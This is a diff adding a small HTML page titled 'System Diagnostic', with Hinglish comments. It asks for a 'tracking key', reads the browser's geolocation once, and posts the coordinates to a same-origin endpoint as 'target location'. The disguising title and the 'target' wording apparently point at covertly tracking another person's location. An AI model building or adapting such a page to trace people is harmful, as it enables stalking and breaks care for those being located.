@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Diagnostic</title>
+    <style>
+        body { background-color: #000; color: #00ff41; font-family: monospace; padding: 20px; text-align: center; }
+        input { background: #111; border: 1px solid #00ff41; color: #00ff41; padding: 10px; margin: 10px; width: 80%; max-width: 300px; text-align: center; letter-spacing: 2px;}
+        button { background: #00ff41; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #00cc33; box-shadow: 0 0 10px #00ff41;}
+    </style>
+</head>
+<body>
+    
+    <!-- Jab app pehli baar khulega -->
+    <div id="setup-box">
+        <h3>BIND DEVICE TO SERVER</h3>
+        <p>Enter your Secret Tracking Key to activate background trace:</p>
+        <input type="text" id="target-key" placeholder="TRK-XXXXXX">
+        <br>
+        <button onclick="startTracking()">ACTIVATE TRACE</button>
+    </div>
+
+    <!-- Key dalne ke baad yeh black screen message aayega -->
+    <h3 id="log" style="display:none;">System background process running...</h3>
+
+    <script>
+        let trackingKey = "";
+
+        function startTracking() {
+            const keyInput = document.getElementById('target-key').value;
+            if(keyInput === "") { alert("Please enter Tracking Key!"); return; }
+            
+            trackingKey = keyInput;
+            
+            // Setup box chupao aur log dikhao
+            document.getElementById('setup-box').style.display = "none";
+            document.getElementById('log').style.display = "block";
+
+            // Browser se location mangna
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocationToServer, handleError, {
+                    enableHighAccuracy: false, timeout: 10000
+                });
+            } else {
+                document.getElementById('log').innerText = "GPS is not supported.";
+            }
+        }
+
+        function sendLocationToServer(position) {
+            // Ab coordinates ke sath Tracking Key bhi ja rahi hai!
+            const data = {
+                trackingKey: trackingKey,
+                lat: position.coords.latitude,
+                lng: position.coords.longitude,
+                accuracy: position.coords.accuracy
+            };
+
+            fetch('/api/update-location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(res => {
+                document.getElementById('log').innerText = "Target location acquired and synced securely.";
+            })
+            .catch(err => document.getElementById('log').innerText = "Connection error!");
+        }
+
+        function handleError(error) {
+            document.getElementById('log').innerText = "Tracking Error: " + error.message;
+        }
+    </script>
+</body>
+</html>
